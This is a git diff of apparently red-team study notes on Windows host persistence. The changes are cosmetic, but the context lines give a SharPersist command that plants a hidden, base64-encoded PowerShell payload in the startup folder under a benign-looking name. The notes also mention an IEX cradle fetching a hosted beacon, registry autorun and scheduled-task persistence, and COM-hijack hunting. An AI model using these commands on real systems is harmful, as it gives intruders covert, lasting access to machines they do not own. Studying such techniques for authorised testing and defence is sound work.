@@ -1,6 +1,7 @@
-# Hoste Persistence Notes
+# Host Persistence Notes
 
 **Task Scheduler**
+
 Creating a scheduled task that will execute a PowerShell payload once every hour
 
 1. Create an IEX cradle that's base64 encoded, /a is our hosted beacon
@@ -24,6 +25,7 @@ Creating a scheduled task that will execute a PowerShell payload once every hour
     -o is the task frequency.
 
 **StartUp Folder**
+
 Things that start automatically when a user first logs in
 ```
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64 blob>" -f "UserEnvSetup" -m add
@@ -31,6 +33,7 @@ execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t
 -f is the filename to save as
 
 **Registry Autorun**
+
 AutoRun values in HKCU and HKLM allow applications to start on boot. 
 
 steps in beacon
@@ -44,6 +47,7 @@ execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t
 -v is the name of the registry key to create.
 
 **Hunting for COM Hijacks**
+
 Easier to hunt for hijacks on our own machine first. Launch procmon64.exe from [sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
 
 We want to filter for
@@ -87,3 +91,7 @@ foreach ($Task in $Tasks)
 }
 ```
 Review this list for possible exploitation parts by rechecking the HKCU and HKLM like above, and how often they are ran, lik at every user login or something of that nature
+
+## Elevated Host persistence
+**Windows Services**
+
